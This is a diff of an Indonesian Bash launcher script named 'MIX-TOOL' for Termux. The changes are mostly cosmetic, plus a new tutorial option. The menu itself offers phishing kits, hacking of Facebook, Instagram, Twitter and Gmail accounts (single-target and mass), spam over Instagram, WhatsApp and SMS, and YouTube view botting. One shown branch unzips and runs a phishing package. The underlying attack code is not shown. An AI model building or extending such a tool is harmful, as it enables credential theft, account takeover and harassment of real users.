@@ -35,11 +35,13 @@ echo -e $g"   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒
 echo -e $g"▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒      " |lolcat 
 echo -e $g"   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   ▒▒▒   " |lolcat
 echo -e $bl"."
-echo -e $bu "__________________________________"
-echo -e $bu  " Tools    : MIX-TOOL$white         " 
-echo -e $bu  " Author   : Mr Mbest $white   " 
-echo -e $bu  " Contact  : 081235862*** $white " 
-echo -e $bu  "_________________________________" 
+echo -e $bu "________________________________________"
+echo -e $bu  " Tools       : MIX-TOOL$white          " 
+echo -e $bu  " Author      : All Master Termux etc$white  " 
+echo -e $bu  " Contact     : 081235862*** $white " 
+
+echo -e $bu  "_______________________________________" 
+sleep 1
 ###################################################
 # CTRL + C
 ###################################################
@@ -59,32 +61,35 @@ while [ $lagi -lt 20 ];
 do
 
 sleep 1
-echo -e $g"  ༎༎༎༎༎༎༎༎༎MENU VIP༎༎༎༎༎༎༎༎༎ "
+echo -e $g"     ༎༎༎༎༎༎༎༎༎MENU VIP༎༎༎༎༎༎༎༎༎ "
 sleep 2
-echo -e $g " [ 1] PHISING V1${enda}";
-echo -e $g " [ 2] PHISING V2${endc}";
-echo -e $g " [ 3] PHISING V3${endc}";
-echo -e $g " [ 4] PHISING V4${endc}";
-echo -e $g " [ 5] PHISING GAME${endc}";
-echo -e $g"  [ 6] Hack fb target${endc}";
-echo -e $g " [ 7] Hack fb massal";
-echo -e $g"  [ 8] Hack fb Target+Massal";
-echo -e $g " [ 9] Hack FB ans (#root)";
-echo -e $g " [10] Hack Instagram (#root)";
-echo -e $g " [11] Hack Twitter (#root)";
-echo -e $g " [12] Hack Gmail (#root)";
-echo -e $g " [13] Fb Info";
-echo -e $g " [14] Santet Online";
-echo -e $g " [15] Spam IG";
-echo -e $g " [16] Spam WA";
-echo -e $g " [17] Spam Sms";
-echo -e $g " [18] Youtube AutoView (#root)";
-echo -e $g " [19] Tembak Kuota XL";
-echo -e $g " [20] Tembak Cewe(khusus jones :v)";
-echo -e $g " [ 0] Modar/Exit";
+echo -e $g" +++++++++++++++++++++++++++++ "
+echo -e $g "   [ 1] PHISING V1${enda}";
+echo -e $g "   [ 2] PHISING V2${endc}";
+echo -e $g "   [ 3] PHISING V3${endc}";
+echo -e $g "   [ 4] PHISING V4${endc}";
+echo -e $g "   [ 5] PHISING GAME${endc}";
+echo -e $g"    [ 6] Hack fb target${endc}";
+echo -e $g "   [ 7] Hack fb massal";
+echo -e $g"    [ 8] Hack fb Target+Massal";
+echo -e $g "   [ 9] Hack FB ans    (#root)";
+echo -e $g "   [10] Hack Instagram (#root)";
+echo -e $g "   [11] Hack Twitter   (#root)";
+echo -e $g "   [12] Hack Gmail     (#root)";
+echo -e $g "   [13] Fb Info";
+echo -e $g "   [14] Santet Online";
+echo -e $g "   [15] Spam IG";
+echo -e $g "   [16] Spam WA";
+echo -e $g "   [17] Spam Sms";
+echo -e $g "   [18] Youtube AutoView (#root)";
+echo -e $g "   [19] Tembak Kuota XL";
+echo -e $g "   [20] Tembak Cewe(khusus jones :v)";
+echo -e $g "   [21] Cara Guna Tool/Tutorial Singkat-_-" ;
+echo -e $g "   [ 0] Modar/Exit";
 echo ""
 echo -e $bu "Pilih Sesuai Selera Anda :)" 
-read -p "⨠⨠⨠" pil  ;
+echo -e $bu "ketik (TT) untuk cara guna/tutor  "
+read -p "====>" pil  ;
 figlet MR MBEST | lolcat
 #phs shelpis
 
@@ -274,13 +279,17 @@ unzip PhisingOnline.zip
 python2 online.py
 
 ;;
+
+21)cd tutor
+;;
 0) echo -e $bu"KHO  -" 
-sleep 1
 echo -e $bu"THANK'S"
+printf "  \e[101m\e[1;79mCreated By ; Faiz Abd Mufti\e[0m\n"
+sleep 2
 exit
 ;;
 
-*) echo "PILIH YG BENER CUK"  | lolcat
+*) echo "PILIH YG BENER CUK !!"  | lolcat
 esac
 done
 done
